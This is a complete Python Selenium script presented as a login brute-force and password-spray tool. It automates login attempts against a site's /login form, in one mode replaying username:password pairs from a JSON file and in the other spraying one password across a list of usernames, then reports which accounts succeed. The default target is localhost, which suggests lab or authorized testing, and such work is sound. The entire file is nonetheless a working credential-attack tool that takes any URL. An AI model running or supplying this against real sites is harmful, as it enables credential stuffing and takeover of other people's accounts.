#!/usr/bin/env python3
"""
Selenium brute-force / password-spray script for testing login forms.

Modes:
  1. Credential List  – try each username:password pair from a JSON file.
  2. Password Spray   – try one password against a list of usernames.

Usage:
  python3 brute.py [--url URL] [--headless]

Be sure Chrome (or Chromium) is installed on the machine.
"""
import json
import sys
import time
from pathlib import Path

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

# webdriver-manager will fetch a compatible chromedriver automatically
from webdriver_manager.chrome import ChromeDriverManager

# ---------------------------------------------------------------------------
# Default file paths (relative to script location)
# ---------------------------------------------------------------------------
SCRIPT_DIR = Path(__file__).resolve().parent
DEFAULT_CREDS_FILE = SCRIPT_DIR / "creds.json"
DEFAULT_USERNAMES_FILE = SCRIPT_DIR / "usernames.txt"


def try_login(driver, base_url, username, password, timeout=5):
    login_url = f"{base_url.rstrip('/')}/login"
    driver.get(login_url)

    # Fill the form
    try:
        user_el = WebDriverWait(driver, timeout).until(
            EC.presence_of_element_located((By.NAME, "username"))
        )
        pass_el = driver.find_element(By.NAME, "password")
    except Exception:
        return False, "login form not found"

    user_el.clear()
    user_el.send_keys(username)
    pass_el.clear()
    pass_el.send_keys(password)

    # Submit form: click button
    try:
        btn = driver.find_element(By.CSS_SELECTOR, "button[type=submit]")
        btn.click()
    except Exception:
        # fallback: submit the form via Enter key on password field
        pass

    # Wait for either a redirect (URL change) or an error paragraph to appear.
    try:
        WebDriverWait(driver, timeout).until(
            EC.any_of(
                EC.url_changes(login_url),
                EC.presence_of_element_located((By.CSS_SELECTOR, "p.error")),
            )
        )
    except Exception:
        return False, "no response"

    # If URL changed away from the login page consider it a success (redirect to dashboard/root)
    current = driver.current_url
    if current.rstrip('/') != login_url.rstrip('/'):
        # Optionally check for dashboard h1
        try:
            h1 = driver.find_element(By.TAG_NAME, "h1").text
            if "welcome" in h1.lower():
                return True, "success"
        except Exception:
            # URL changed but couldn't find expected h1 — still consider redirect a success
            return True, f"redirected to {current}"

    # If URL didn't change, check for error paragraph
    try:
        err = driver.find_element(By.CSS_SELECTOR, "p.error").text
        return False, f"server error: {err}"
    except Exception:
        pass

    return False, "unknown result"


# ---------------------------------------------------------------------------
# Mode runners
# ---------------------------------------------------------------------------

def run_credential_list(driver, base_url, creds_path: Path):
    """Mode 1: try each username:password pair from a JSON file."""
    if not creds_path.exists():
        print(f"Credentials file not found: {creds_path}")
        return

    with creds_path.open() as f:
        creds = json.load(f)

    for c in creds:
        user = c.get("username")
        pwd = c.get("password")
        print(f"Trying {user}:{pwd} ...", end=" ")
        ok, reason = try_login(driver, base_url, user, pwd)
        if ok:
            print("SUCCESS ->", reason)
        else:
            print("FAIL ->", reason)
        time.sleep(0.5)


def run_password_spray(driver, base_url, usernames_path: Path, password: str):
    """Mode 2: try a single password against many usernames."""
    if not usernames_path.exists():
        print(f"Usernames file not found: {usernames_path}")
        return

    usernames = [
        line.strip()
        for line in usernames_path.read_text().splitlines()
        if line.strip() and not line.startswith("#")
    ]

    print(f"\nSpraying password '{password}' against {len(usernames)} usernames...\n")
    hits = []
    for user in usernames:
        print(f"Trying {user}:{password} ...", end=" ")
        ok, reason = try_login(driver, base_url, user, password)
        if ok:
            print("SUCCESS ->", reason)
            hits.append(user)
        else:
            print("FAIL ->", reason)
        time.sleep(0.5)

    print("\n--- Summary ---")
    if hits:
        print(f"Users with password '{password}': {', '.join(hits)}")
    else:
        print(f"No users found with password '{password}'")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def print_menu():
    print("\n=== Login Brute-Force Tool ===")
    print("1. Credential List  (username:password pairs from JSON)")
    print("2. Password Spray   (one password vs many usernames)")
    print("q. Quit")
    print()


def main():
    import argparse

    parser = argparse.ArgumentParser(
        description="Selenium brute-force / password-spray tool"
    )
    parser.add_argument(
        "--url", default="http://127.0.0.1:8080", help="Base URL of target site"
    )
    parser.add_argument(
        "--headless", action="store_true", help="Run browser in headless mode"
    )
    args = parser.parse_args()

    # Setup Chrome driver once
    chrome_options = Options()
    if args.headless:
        chrome_options.add_argument("--headless=new")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--window-size=1200,800")

    service = Service(ChromeDriverManager().install())
    driver = webdriver.Chrome(service=service, options=chrome_options)

    try:
        while True:
            print_menu()
            choice = input("Select mode: ").strip().lower()

            if choice == "1":
                creds_path = input(
                    f"Credentials JSON path [{DEFAULT_CREDS_FILE}]: "
                ).strip()
                creds_path = Path(creds_path) if creds_path else DEFAULT_CREDS_FILE
                run_credential_list(driver, args.url, creds_path)

            elif choice == "2":
                password = input("Enter the password to spray: ").strip()
                if not password:
                    print("Password cannot be empty.")
                    continue
                usernames_path = input(
                    f"Usernames file path [{DEFAULT_USERNAMES_FILE}]: "
                ).strip()
                usernames_path = (
                    Path(usernames_path) if usernames_path else DEFAULT_USERNAMES_FILE
                )
                run_password_spray(driver, args.url, usernames_path, password)

            elif choice in ("q", "quit", "exit"):
                print("Bye!")
                break
            else:
                print("Invalid choice, try again.")
    finally:
        driver.quit()


if __name__ == "__main__":
    main()
